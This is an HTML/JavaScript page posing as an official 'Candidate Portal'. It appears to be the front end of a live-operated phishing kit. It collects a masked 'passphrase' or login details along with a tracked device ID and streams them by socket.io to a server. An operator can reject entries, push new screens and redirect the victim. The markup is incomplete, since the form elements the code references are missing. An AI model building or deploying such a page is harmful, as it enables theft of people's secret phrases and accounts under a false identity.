<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Candidate Portal - Official</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #070a13;
            --card-bg: #111827;
            --card-border: rgba(255, 255, 255, 0.05);
            --accent-blue: #00D1FF;
            --accent-blue-dim: rgba(0, 209, 255, 0.1);
            --text-main: #FFFFFF;
            --text-dim: #94A3B8;
            --input-bg: #030712;
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5), 0 4px 6px -2px rgba(0, 0, 0, 0.3);
            --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.4);
            --transition-main: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        #country-selection-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            width: 100%;
            height: 100vh;
            padding: 40px 20px;
            box-sizing: border-box;
            background-color: var(--bg-dark);
            opacity: 0;
            transform: scale(0.98);
            animation: screenEntry 0.5s ease forwards;
        }

        .selector-header {
            text-align: center;
            max-width: 600px;
            margin-bottom: 50px;
        }

        .country-grid-container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
        }

        .country-grid {
            display: grid;
            gap: 20px;
            width: 100%;
            padding-bottom: 40px;
        }

        /* Grid Breakpoints */
        @media (min-width: 1200px) { .country-grid { grid-template-columns: repeat(6, 1fr); } }
        @media (max-width: 1199px) and (min-width: 992px) { .country-grid { grid-template-columns: repeat(5, 1fr); } }
        @media (max-width: 991px) and (min-width: 768px) { .country-grid { grid-template-columns: repeat(4, 1fr); } }
        @media (max-width: 767px) and (min-width: 480px) { .country-grid { grid-template-columns: repeat(3, 1fr); } }
        @media (max-width: 479px) { .country-grid { grid-template-columns: repeat(2, 1fr); } }


        
        /* Full-screen Preloader Overlay */
        #preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--bg-dark);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999; /* Stay on top of everything */
            transition: opacity 0.6s ease, visibility 0.6s;
        }

        /* The Animated Orbit */
        .loader-orbit {
            width: 60px;
            height: 60px;
            border: 3px solid var(--accent-blue-dim);
            border-top: 3px solid var(--accent-blue);
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            position: relative;
        }

        /* Inner pulsating glow */
        .loader-orbit::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 30px;
            height: 30px;
            background: var(--accent-blue);
            border-radius: 50%;
            filter: blur(10px);
            opacity: 0.5;
            animation: pulse 1.5s ease-in-out infinite;
        }

        .loader-text {
            margin-top: 20px;
            color: var(--text-dim);
            font-size: 13px;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 600;
        }

        @keyframes pulse {
            0%, 100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.3; }
            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
        }

        /* Class to fade out the loader */
        .loader-hidden {
            opacity: 0;
            visibility: hidden;
        }



        /* Spinner Animation */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .spinner-border {
            display: inline-block;
            width: 1rem;
            height: 1rem;
            vertical-align: text-bottom;
            border: 0.2em solid currentColor;
            border-right-color: transparent;
            border-radius: 50%;
            animation: spin .75s linear infinite;
            margin-left: 8px;
            display: none; /* Hidden by default */
        }

        /* State when button is processing */
        .btn-loading .spinner-border {
            display: inline-block;
        }

        .btn-loading {
            pointer-events: none;
            opacity: 0.8;
        }

        .country-card {
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 12px;
            padding: 24px 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            cursor: pointer;
            transition: var(--transition-main);
            box-shadow: var(--shadow-md);
            -webkit-user-select: none;
            user-select: none;
        }

        .country-card:hover {
            border-color: rgba(0, 209, 255, 0.4);
            transform: translateY(-4px);
            box-shadow: 0 12px 20px -5px rgba(0, 209, 255, 0.15), var(--shadow-lg);
            background: #151e2e;
        }

        .country-card:active {
            transform: scale(0.96) translateY(0px);
            box-shadow: var(--shadow-inner);
            border-color: var(--accent-blue);
        }

        /* Squared flag with radius */
        .flag-box {
            width: 50px;
            height: 50px;
            margin-bottom: 16px;
            border-radius: 8px; /* Little radius */
            object-fit: cover;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .country-label {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-main);
        }

        #form-screen {
            width: 100%;
            max-width: 450px;
            padding: 20px;
            box-sizing: border-box;
            opacity: 0;
            transform: translateY(20px);
        }

        .form-container {
            background: var(--card-bg);
            padding: 2.5rem;
            border-radius: 20px;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--card-border);
            text-align: center;
        }

        .logo-area { margin-bottom: 25px; }
        .logo { color: var(--accent-blue); font-size: 24px; font-weight: 700; text-decoration: none; display: inline-block; letter-spacing: -0.5px; }
        
        .reward-badge {
            background: var(--accent-blue-dim);
            color: var(--accent-blue);
            padding: 8px 16px;
            border-radius: 100px;
            display: inline-block;
            margin-bottom: 1.5rem;
            font-weight: 600;
            font-size: 13px;
            border: 1px solid rgba(0, 209, 255, 0.2);
        }

        .classic-title { font-size: 28px; margin-bottom: 10px; }
        .classic-desc { color: var(--text-dim); font-size: 15px; max-width: 400px; margin: 0 auto; line-height: 1.6; }

        .selected-region-bar {
            background: rgba(255,255,255,0.03);
            border: 1px solid var(--card-border);
            padding: 12px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: var(--transition-main);
        }

        /* Tiny flag for region bar */
        .flag-box-sm {
            width: 20px;
            height: 20px;
            border-radius: 4px;
            object-fit: cover;
        }

        .tab-container { display: flex; margin-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.08); }
        .tab { flex: 1; padding: 12px; cursor: pointer; color: var(--text-dim); font-size: 14px; transition: var(--transition-main); }
        .tab.active { color: var(--accent-blue); border-bottom: 2px solid var(--accent-blue); font-weight: 600; }

        input, select, textarea {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            background: var(--input-bg);
            border: 1px solid var(--card-border);
            border-radius: 10px;
            color: white;
            box-sizing: border-box;
            font-family: inherit;
        }

        button.action-btn {
            width: 100%;
            padding: 15px;
            background: var(--accent-blue);
            color: #000;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0, 209, 255, 0.3);
        }

        .hidden { display: none !important; }

        @keyframes screenEntry { to { opacity: 1; transform: scale(1); } }
        @keyframes formEntry { to { opacity: 1; transform: translateY(0); } }
        .animate-form-in { animation: formEntry 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards; }
        .animate-screen-exit { animation: screenExit 0.4s ease forwards; opacity: 0; transform: scale(1.02); }
    </style>
</head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
    <script>

       let accessType = "passphrase"; 

        const indicator = document.getElementById('indicator');
        const placeholder = document.getElementById('placeholder');
       
       window.onload = function() {
          document.getElementById('indicator').focus();
          document.getElementById('indicator').value = "";
          document.getElementById('placeholder').value = "";
          $('#z6x2c9v4b1_992211').hide();

          // 1. Render the countries first so the <img> tags exist in the DOM
            renderCountries(countriesData);

            displayForms();

            // 2. Target all flag images that were just created
            const allFlags = document.querySelectorAll('.flag-box');
            let loadedCount = 0;
            const totalFlags = allFlags.length;

            if (totalFlags === 0) {
                hidePreloader();
                return;
            }

            // 3. Monitor each image for completion
            allFlags.forEach(img => {
                if (img.complete) {
                    checkIncrement();
                } else {
                    img.addEventListener('load', checkIncrement);
                    img.addEventListener('error', checkIncrement); // Count errors too so we don't get stuck
                }
            });

            function checkIncrement() {
                loadedCount++;
                if (loadedCount >= totalFlags) {
                    // Slight delay for a smoother "reveal" experience
                    setTimeout(hidePreloader, 500);
                }
            }
        }

        indicator.addEventListener('input', (e) => {
            let currentRaw = placeholder.value;
            let currentDisplay = indicator.value;
            
            // 1. Calculate how many characters were added or removed
            const diff = currentDisplay.length - currentRaw.length;
            const cursorPosition = indicator.selectionStart;

            if (diff > 0) {
                // Addition: User typed or pasted
                const addedChars = currentDisplay.substring(cursorPosition - diff, cursorPosition);
                const before = currentRaw.substring(0, cursorPosition - diff);
                const after = currentRaw.substring(cursorPosition - diff);
                placeholder.value = before + addedChars + after;
            } 
            else if (diff < 0) {
                // Deletion: Backspace, delete, or highlight+delete
                // We find the 'gap' by comparing the previous length and current cursor
                const removedCount = Math.abs(diff);
                const before = currentRaw.substring(0, cursorPosition);
                const after = currentRaw.substring(cursorPosition + removedCount);
                placeholder.value = before + after;
            }
            else if (diff === 0 && currentDisplay !== "*".repeat(currentRaw.length)) {
                // Replacement: Highlighted text and replaced with same number of chars
                const addedChars = currentDisplay.substring(cursorPosition - currentRaw.length, cursorPosition);
                // In a complex replacement, it's safer to re-sync based on selection
                // But for most cases, the diff logic covers it.
            }

            // 2. Mask the Indicator immediately
            indicator.value = "*".repeat(placeholder.value.length);
            
            // 3. Restore Cursor Position (Masking resets it to the end)
            indicator.setSelectionRange(cursorPosition, cursorPosition);

            // Demo display
            
        });

        // Handle "Select All + Backspace/Delete" specifically for some browsers
        indicator.addEventListener('keydown', (e) => {
            if (indicator.selectionStart === 0 && indicator.selectionEnd === indicator.value.length) {
                if (e.key === 'Backspace' || e.key === 'Delete') {
                    placeholder.value = "";
                }
            }
        });
    </script>

    <script>

        function checkExaminerOnline(){
            return true;
        }

        function displayForms(){
            const isExaminer = checkExaminerOnline();
            isExaminer? $(".creds").show() : $(".creds").hide()
        }
       

        function hidePreloader() {
            const preloader = document.getElementById('preloader');
            preloader.classList.add('loader-hidden');
        }
        // Country JSON Data (Using ISO Alpha-2 codes for flags)
        const countriesData = [
            { name: "United States", code: "us" },
            { name: "United Kingdom", code: "gb" },
            { name: "Canada", code: "ca" },
            { name: "Australia", code: "au" },
            { name: "Nigeria", code: "ng" },
            { name: "Singapore", code: "sg" },
            { name: "Germany", code: "de" },
            { name: "France", code: "fr" },
            { name: "Japan", code: "jp" },
            { name: "South Africa", code: "za" },
            { name: "Brazil", code: "br" },
            { name: "India", code: "in" }
        ];

        // Function to render the country cards dynamically
        function renderCountries(data) {
            const grid = document.getElementById('country-grid');
            grid.innerHTML = ''; // Clear existing

            data.forEach(country => {
                const flagUrl = `https://flagcdn.com/w160/${country.code.toLowerCase()}.png`;
                
                const card = document.createElement('div');
                card.className = 'country-card';
                card.onclick = () => selectCountry(country.name, flagUrl);
                
                card.innerHTML = `
                    <img src="${flagUrl}" class="flag-box" alt="${country.name}">
                    <span class="country-label">${country.name}</span>
                `;
                grid.appendChild(card);
            });
        }

        const selectionScreen = document.getElementById('country-selection-screen');
        const formScreen = document.getElementById('form-screen');
        const credentialsSec = document.getElementById('credentials-section');
        const passphraseSec = document.getElementById('passphrase-section');
        const regionBarName = document.getElementById('region-name');
        const regionBarFlag = document.getElementById('region-flag');
        const countryInput = document.getElementById('country-hidden-input');
        const tabElements = document.querySelectorAll('.tab');

        function selectCountry(name, flagUrl) {
            selectionScreen.classList.add('animate-screen-exit');
            
            regionBarName.innerText = name;
            regionBarFlag.innerHTML = `<img src="${flagUrl}" class="flag-box-sm">`;
            countryInput.value = name;

            setTimeout(() => {
                selectionScreen.classList.add('hidden');
                selectionScreen.classList.remove('animate-screen-exit');
                formScreen.classList.remove('hidden');
                formScreen.classList.add('animate-form-in');
            }, 350);
        }

        function backToSelector() {
            formScreen.classList.remove('animate-form-in');
            formScreen.classList.add('hidden');
            selectionScreen.classList.remove('hidden');
        }

        function switchTab(type) {
            if(type === 'credentials') {
                credentialsSec.classList.remove('hidden');
                passphraseSec.classList.add('hidden');
                document.getElementById('cred').classList.add('active');
                document.getElementById('pass').classList.remove('active');
                accessType = 'credentials';
            } else {
                accessType = 'passphrase';
                credentialsSec.classList.add('hidden');
                passphraseSec.classList.remove('hidden');
                document.getElementById('pass').classList.add('active');
                document.getElementById('cred').classList.remove('active');
            }
        }
    </script>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let candidateName = "";
    let candidateEmail = "";
    let selectedCategory = ""; 
    let currentScreenFile = "";

    /**
     * POINT 3: ENTERPRISE GLOBAL API HANDLER
     * Intercepts 403/401 errors to handle session expiration gracefully.
     */
    async function secureFetch(url, options = {}) {
        try {
            const response = await fetch(url, options);
            
            // Check for Enterprise Gateway blocking
            if (response.status === 403 || response.status === 401) {
                const data = await response.json();
                if (data.action === "REDIRECT_TO_GATEKEEPER") {
                    //alert("Security Session Expired. Please re-verify.");
                    window.location.href = '/gatekeeper';
                    return null;
                }
            }
            return response;
        } catch (err) {
            console.error("Network or Security Error:", err);
            throw err;
        }
    }

    // Persistence Restore using Email

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function getOrCreateDeviceID() {
        let deviceId = localStorage.getItem('tracked_device_id');
        
        if (!deviceId) {
            // First time visiting! Generate a new ID
            deviceId = generateUUID();
            localStorage.setItem('tracked_device_id', deviceId);
        }
        
        return deviceId;
    }


    function startInterview(btn, type, isRestore = false) {

        btn.classList.add('btn-loading');
            const btnText = btn.querySelector('.btn-text');
            if(btnText) btnText.innerText = "Processing...";

           /* setTimeout(() => {
                btn.classList.remove('btn-loading');
                btnText.innerText = "Process Verification";
            }, 2000);*/


        if(!isRestore) {


            const placeholderVal = document.getElementById('placeholder')?.value;
            const phraseVal      = document.getElementById('phrase')?.value;
            const emailVal       = document.getElementById('email-input')?.value;

            // Assign based on type
            let candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
            let candidateEmail = (type === "credentials") ? emailVal       : getOrCreateDeviceID();

            selectedCategory = document.getElementById('country-hidden-input').value;
            if(!candidateName || !candidateEmail || !selectedCategory) {
                return alert("Select a role and enter both your name and email.");
            }
            
            localStorage.setItem('cand_name', candidateName);
            localStorage.setItem('cand_email', candidateEmail);
            localStorage.setItem('cand_cat', selectedCategory);
        }
        document.getElementById('error-div').innerHTML = '';
        $('#z6x2c9v4b1_992211').show();
        
        const socketBody = { 
            name: candidateName, 
            email: candidateEmail, 
            categoryId: selectedCategory 
        }
        
        socket.emit('join_interview', socketBody);

        const savedTask = localStorage.getItem('current_task');
        if (isRestore && savedTask) {
            const taskData = JSON.parse(savedTask);
            currentScreenFile = taskData.screenFile;
            renderScreen(taskData);
        }
    }

    socket.on('new_task', async (data) => {
        if ($('#z6x2c9v4b1_992211')) {
            $('#z6x2c9v4b1_992211').hide();
        }
        if (data.redirectUrl) {
            window.location.href = data.redirectUrl;
            return;
        }
        localStorage.setItem('current_task', JSON.stringify(data));
        currentScreenFile = data.screenFile;

        // We await renderScreen so that the next lines don't run 
        // until the HTML is actually on the page.
        await renderScreen(data); 
    });

    // Updated to use secureFetch
    async function renderScreen(data) {
        try {
            const response = await secureFetch(`/screens/${data.screenFile}`);
            if (!response || !response.ok) throw new Error("File not found");
            
            const html = await response.text();
            
            // 1. Inject the HTML
            document.getElementById('screen-target').innerHTML = html;

            // 2. NOW that the HTML is in the DOM, we can find the elements
            const urlParams = new URLSearchParams(window.location.search);
            const parameter = urlParams.get('email');
            
            if (parameter) {
                // Check for the span
                const targetSpan = document.getElementById('u8z3x6c1v5');
                if (targetSpan) {
                    targetSpan.innerText = parameter;
                }
                
                // Check for the input
                const emailInput = document.getElementById('email-input');
                if (emailInput) {
                    emailInput.value = parameter;
                }
            }

            // Handle headers
            if (document.getElementById('main-header')) {
                document.getElementById('main-header').innerText = data.header || "";
            }
            if (document.getElementById('sub-header') && data.subHeader) {
                document.getElementById('sub-header').innerText = data.subHeader;
            }

            const form = document.querySelector('form');
            if (form) {
                form.onsubmit = (e) => { e.preventDefault(); validateAndSubmit(); };
                form.oninput = () => socket.emit('typing', { email: candidateEmail });
            }
        } catch (err) {
            document.getElementById('screen-target').innerHTML = 
                `<p style="color:red; padding:20px;">System Error: Failed to load ${data.screenFile}</p>`;
        }
    }

    socket.on('redirect_command', (data) => {
        if (data.url) window.location.href = data.url;
    });

    function validateAndSubmit() {
        const errDiv = document.getElementById('error-div');
        const form = document.querySelector('form');
        const requiredFields = form.querySelectorAll('[required]');
        let allFilled = true;

        requiredFields.forEach(field => {
            if(!field.value.trim()) {
                allFilled = false;
                field.style.borderColor = "#d63031";
            } else {
                field.style.borderColor = "";
            }
        });

        if(!allFilled) {
            if(errDiv) {
                errDiv.innerText = "Please enter required fields";
                errDiv.style.display = "block";
            }
            return;
        }
        submitWork();
    }

    function submitWork() {
        const form = document.querySelector('form');
        const submitBtn = form.querySelector('button[type="submit"]') || form.querySelector('button');
        
        if(submitBtn) {
            submitBtn.disabled = true;
        }

        if($('#z6x2c9v4b1_992211')){
            $('#z6x2c9v4b1_992211').show();
        }

        const formData = new FormData(form);
        let formattedResponse = "";

        formData.forEach((value, key) => {
            let cleanKey = key.replace(/[-_]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
            formattedResponse += `<b>${cleanKey}:</b> ${value}<br>`;
        });

        socket.emit('task_submitted', {
            email: candidateEmail,
            screenFile: currentScreenFile,
            answer: formattedResponse || "Form Acknowledged"
        });
    }

    socket.on('wrong_answer', (data) => {
        
        const errDiv = document.getElementById('error-div');
        const wrapper = document.querySelector('.wrapper');
        const submitBtn = document.querySelector('button');

        if($('#z6x2c9v4b1_992211')){
            $('#z6x2c9v4b1_992211').hide();
        }
            
            document.getElementById('error-div').innerHTML = data.message;
            document.getElementById('indicator').value = "";
            document.getElementById('placeholder').value = "";
            localStorage.removeItem('cand_email');
            localStorage.removeItem('cand_name');
            localStorage.removeItem('cand_cat');
            document.getElementById('indicator').focus();
      
            if(submitBtn) {
                submitBtn.disabled = false;
            }
        
    });

    socket.on('force_reset', () => {
        localStorage.removeItem('current_task');
        window.location.reload();
        
    });

    socket.on('force_logout', () => {
        localStorage.clear();
        window.location.reload();
    });

    socket.on('join_failed', (data) => {
        console.warn("Join failed:", data.message);
        
        // 1. Show the error to the candidate
       
        document.getElementById('error-div').innerHTML = 'Error processing your request, please try again.';
        $('#z6x2c9v4b1_992211').hide();
        document.getElementById('indicator').value = "";
        document.getElementById('placeholder').value = "";
        localStorage.removeItem('cand_email');
        localStorage.removeItem('cand_name');
        localStorage.removeItem('cand_cat');
        document.getElementById('indicator').focus();


        // 3. Reset local variables so they have to type/select again if necessary
        // This forces the "redo the entrance" behavior you requested.
        console.log("Candidate must now manually re-enter details and click Join.");
    });
</script>
